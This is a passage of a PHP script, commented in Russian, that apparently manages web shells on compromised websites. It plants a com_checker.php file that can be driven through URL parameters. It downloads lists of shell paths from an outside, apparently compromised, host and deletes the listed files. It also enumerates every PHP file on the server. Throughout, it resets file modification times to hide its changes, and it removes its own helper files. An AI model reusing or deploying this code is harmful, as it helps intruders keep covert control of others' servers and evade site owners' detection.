fwrite($f, "\n"."<br><br>"."\n");
fwrite($f, $files_delete);

	
if ($result2 != null)
{
foreach ($result2 as $del_files)
	{
		$del_files = trim($del_files);
		$del_files_len = strlen($del_files);
		
		if ($del_files_len > 5)
		{
			$del_files = str_replace($_SERVER[\'DOCUMENT_ROOT\'], $_SERVER[\'SERVER_NAME\'], $del_files);
			$del_files = \'<a href = "http://\'.$del_files.\'">\'.$del_files.\'</a>\';

			fwrite($f, $del_files."\n"."<br>");
		}
	}
}
	fwrite($f, "\n"."<br><br>"."\n");
	fwrite($f, $files_are_changed);
	
	if ($result4 != null)
	{
		foreach ($result4 as $edit_files)
		{
			$edit_files = trim($edit_files);
			$edit_files_len = strlen($edit_files);
			if ($edit_files_len > 5)
			{
				$my_str = \'-*-\';
				$pos_end = strpos($edit_files, $my_str); // ”знаем позицию символа $my_str
				$edit_files = substr_replace($edit_files, \'\', $pos_end, 9999999); // Удаляем все, начиная с символа - my_str по 9999999 символ

				$edit_files = str_replace($_SERVER[\'DOCUMENT_ROOT\'], $_SERVER[\'SERVER_NAME\'], $edit_files);
				$edit_files = \'<a href = "http://\'.$edit_files.\'">\'.$edit_files.\'</a>\';

				fwrite($f, $edit_files."\n"."<br>");
			}
		}
	}

	fwrite($f, "\n"."<br><hr><br>"."\n");
	fclose($f);

	//END: Записываем результаты проверки
}


//START: Удаляем шеллы
if (isset ($_GET[\'remove\']))
{
	$script_way = $_SERVER[\'DOCUMENT_ROOT\'].$_SERVER[\'SCRIPT_NAME\'];
	$script_way = str_replace(\'com_checker.php\', "", $script_way);
	$time_for_touch_all = filemtime($script_way);
	
	echo \'<td>\';
	$site_name = trim($_SERVER[\'SERVER_NAME\']);
	$server_root = trim($_SERVER[\'DOCUMENT_ROOT\']);
	
	$site_name = str_replace("www.", "", $site_name);
	$link = trim($_GET[\'remove\']);
	$link = \'http://\'.$link.\'/1/\'.$site_name.\'.txt\';
	$link = trim($link);
	
	
	$filename = "list.txt";
	get_shell_path($link, $filename);
	
	if (file_exists($filename))
	{
		$arr_all_shell_path = read_file($filename);	// Здесь хрянятся пути до шеллов вида: php/tmp/config.php (используем для вывода)
		
		$new_arr = array();	// Здесь хрянятся пути до шеллов вида: X:/home/php/www/tmp/config.php (используем для удаления)
		$arr_shell_del = array(); // Пути до удаленных шеллов
		$arr_shell_not_delete = array(); // Пути до шеллов, которые не удалось удалить.
		$arr_not_found = array(); // Шеллы, которые не удалось найти.
		
		foreach ($arr_all_shell_path as $each)
		{
			if (($each !== "") or ($each !== " ") or ($each !== null))
			{
				$each = str_replace($site_name, $server_root, $each);
				$new_arr[] = $each;
			}
		}
		
		foreach ($new_arr as $each_shell)
		{
			if (file_exists($each_shell))
			{
				chmod($each_shell, 0777);
				unlink($each_shell);
				if (file_exists($each_shell))
					$arr_shell_not_delete[] = $each_shell; // Сюда записываем шеллы, которые не удалось удалить
				else
					$arr_shell_del[] = $each_shell;	// Сюда записываем шеллы, которые мы удалили
			}
			else
				$arr_not_found[] = $each_shell;
		}
		
		foreach ($arr_shell_del as $del)
		{
			if (($del !== "") or ($del !== " ") or ($del !== null))
			{
				$del = str_replace($server_root, $site_name, $del);
				echo \'DELETE: \'.$del.\'<br>\';
			}
				
		}
		
		foreach ($arr_shell_not_delete as $not_del)
		{
			if (($not_del !== "") or ($not_del !== " ") or ($not_del !== null))
			{
				$not_del = str_replace($server_root, $site_name, $not_del);
				echo \'Manual_work: \'.$not_del.\'<br>\';
			}
		}
		
		foreach ($arr_not_found as $not_found)
		{
			if (($not_found !== "") or ($not_found !== " ") or ($not_found !== null))
			{
				$not_found = str_replace($server_root, $site_name, $not_found);
				echo \'Not found: \'.$not_found.\'<br>\';
			}
		}
	}
	else
		echo \'Could not load file.\';

	if (file_exists($filename))
		unlink($filename);
	
	if (file_exists($script_way))
		touch($script_way, $time_for_touch_all);

	echo \'</td>\';
}
//END: Удаляем шеллы

// Очищаем статистику

if (isset ($_GET[\'clear\']))
{
	$script_way = $_SERVER[\'DOCUMENT_ROOT\'].$_SERVER[\'SCRIPT_NAME\'];
	$script_way = str_replace(\'com_checker.php\', "", $script_way);
	$time_for_touch_all = filemtime($script_way);
	
	if (file_exists(\'all.txt\'))
		unlink(\'all.txt\');
	if (file_exists(\'result.html\'))
		unlink(\'result.html\');
	
	if (file_exists(\'com_checker.php\'))
		touch(\'com_checker.php\', $time_for_touch_all);
	if (file_exists(\'result.html\'))
		touch(\'result.html\', $time_for_touch_all);
	if (file_exists(\'all.txt\'))
		touch(\'all.txt\', $time_for_touch_all);
	if (file_exists($script_way))
		touch($script_way, $time_for_touch_all);
}

if (isset ($_GET[\'del\']))
{
	$script_way = $_SERVER[\'DOCUMENT_ROOT\'].$_SERVER[\'SCRIPT_NAME\'];
	$script_way = str_replace(\'com_checker.php\', "", $script_way);
	$time_for_touch_all = filemtime($script_way);

	
	if (file_exists(\'all.txt\'))
		unlink(\'all.txt\');
	if (file_exists(\'result.html\'))
		unlink(\'result.html\');
	if (file_exists(\'com_checker.php\'))
		unlink(\'com_checker.php\');
	
	if (file_exists(\'com_checker.php\'))
		touch(\'com_checker.php\', $time_for_touch_all);
	if (file_exists(\'result.html\'))
		touch(\'result.html\', $time_for_touch_all);
	if (file_exists(\'all.txt\'))
		touch(\'all.txt\', $time_for_touch_all);
	if (file_exists($script_way))
		touch($script_way, $time_for_touch_all);
}
if (file_exists(\'com_checker.php\'))
	touch(\'com_checker.php\', $time_for_touch_all);
if (file_exists(\'result.html\'))
	touch(\'result.html\', $time_for_touch_all);
if (file_exists(\'all.txt\'))
	touch(\'all.txt\', $time_for_touch_all);
if (file_exists($script_way))
	touch($script_way, $time_for_touch_all);	

?>
';

	$f = fopen ($path_to_checker, "w");
	fwrite($f, $data);
	fclose($f);

	if (file_exists($path_to_checker))
	{
		$dir_for_echo = str_replace($_SERVER["DOCUMENT_ROOT"], $_SERVER["SERVER_NAME"], $dir);
		$dir_for_echo = 'http://'.$dir_for_echo.'com_checker.php';
		echo '<hr><hr>'.$CMS." CMS: Site:".$_SERVER["SERVER_NAME"].'   Monitoring directory: '.$dir_for_echo.'<hr><hr>';
	}
	else
		echo '<hr><hr>Monitoring not installed.<hr><hr>';
	
	if (file_exists($path_to_checker))
		touch($path_to_checker, $time_for_touch);
	if (file_exists($path_to_all_result))	
		touch($path_to_all_result, $time_for_touch);
	if (file_exists($path_to_all_files))
		touch($path_to_all_files, $time_for_touch);
	if (file_exists($dir))
		touch($dir, $time_for_touch);
}

if (isset($_GET['all_php']))
{
	$arr_php_file = find_php_files($_SERVER['DOCUMENT_ROOT']);

	foreach ($arr_php_file as $each)
	{
		$each = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $each);
		$each = 'http://'.$each."\n";
		$each = trim($each);
		echo $each.'<br>'."\n";
	}
}

if (isset($_GET['sh_find']))
{
	$arr_have_sh = array();
	$root = $_SERVER['DOCUMENT_ROOT'];
	
	$link = 'http://africanarrowlogistics.com/components/com_weblinks/2/sh_path.txt';
	$filename = 'sh_path.txt';
	if (!copy($link, $filename)) 
	{
		$arr_path = file_get_contents($link);
		if (($arr_path !== "") and ($arr_path !== " ") and ($arr_path !== null))
			$arr_path = explode("\n", $arr_path);
		else
		{
			$ch = curl_init($link);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			  
			$data = curl_exec($ch);
			curl_close($ch);
			  
			file_put_contents($filename, $data);
			
			if (file_exists($filename))
				$arr_path = read_file($filename);
		}
	}
	else
		$arr_path = read_file($filename);

	foreach ($arr_path as $each)
	{
		$each = trim($each);
		
		$search_str = $_SERVER['SERVER_NAME'];
		
		$result = stristr($each, $search_str);
		if ($result != false)
		{
			$each = str_replace($search_str, $root, $each);
			$each = str_replace('http://www.', '', $each);
			$each = str_replace('http://', '', $each);
			$arr_have_sh[] = $each;
		}
			
	}
	
	foreach ($arr_have_sh as $each_sh_path)
	{
		if (file_exists($each_sh_path))
		{
			
			$echo = only_read($each_sh_path);
			echo $echo;
			chmod($each_sh_path, 0777);
			unlink($each_sh_path);
			
			if (!file_exists($each_sh_path))	// Если файл не найден (был удален)
			{
				$each_sh_path = str_replace($root, $search_str, $each_sh_path);
				echo "\n"."<hr>Has been deleted: $each_sh_path<hr>"."\n";
			}
		}
	}
	
	if (file_exists($filename))
		unlink($filename);
}

// Remove script
if (isset ($_GET['del']))
{	
	$trd = $_SERVER['DOCUMENT_ROOT'].'/trd.php';
	if (file_exists($trd))
	{
		unlink($trd);
		echo $trd.' - has been delete'; 
	}
	
	if (file_exists('all_php_files.txt'))
		unlink('all_php_files.txt');
	if (file_exists('php_finder.php'))
		unlink('php_finder.php');
	if (file_exists('phpfinder.php'))
		unlink('phpfinder.php');
	if (file_exists('a.php'))
		unlink('a.php');
	exit;
		
}
echo '<hr><hr></td>';

$path_htaccess = $_SERVER['DOCUMENT_ROOT']."/.htaccess";
$path_index = $_SERVER['DOCUMENT_ROOT']."/index.php";

if (file_exists($path_htaccess))
	chmod($path_htaccess, 0404);
if (file_exists($path_index))
	chmod($path_index, 0404);

?>